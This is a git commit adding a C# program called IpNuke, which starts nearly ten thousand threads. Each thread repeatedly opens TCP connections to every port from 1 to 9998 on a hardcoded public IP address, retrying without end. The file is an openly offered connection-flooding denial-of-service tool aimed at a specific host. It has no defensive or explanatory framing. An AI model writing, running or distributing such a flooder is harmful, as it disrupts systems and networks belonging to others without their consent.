09b70dad54f1edd0c3a3c492257cdaf123364847
ryckN hax0r <43122627+thinksystem@users.noreply.github.com>
2020-01-14 13:10:07 +0000

    added code

---
+++ IpNuke/Program.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.Threading;
+using System.Net.Sockets;
+
+namespace IpNuke
+{
+    class Program
+    {
+
+        static string targethost = ("80.30.199.231");
+
+        static void Main(string[] args)
+        {
+            PrintInColor("Started ip nuke on " + targethost, ConsoleColor.Yellow);
+            NukeIp();
+        }
+        static public void NukeIp()
+        {
+            for (int i = 1; i < 9999; i++)
+            {
+                Thread t = new Thread(() => ConnectTcp(targethost, i));
+                t.Start();
+            }
+        }
+        static public void ConnectTcp(string ip, int port)
+        {
+            TcpClient client = null;
+
+            try
+            {
+                client = new TcpClient();
+                client.Connect(ip, port);
+            }
+            catch (Exception e)
+            {
+                
+            }
+            finally
+            {
+                ConnectTcp(ip, port);
+            }
+        }
+        static public void PrintInColor(string str, ConsoleColor color, bool setwhiteafterprinted = true)
+        {
+            Console.ForegroundColor = color;
+            Console.WriteLine(str);
+            if (setwhiteafterprinted)
+                Console.ForegroundColor = ConsoleColor.White;
+        }
+    }
+}
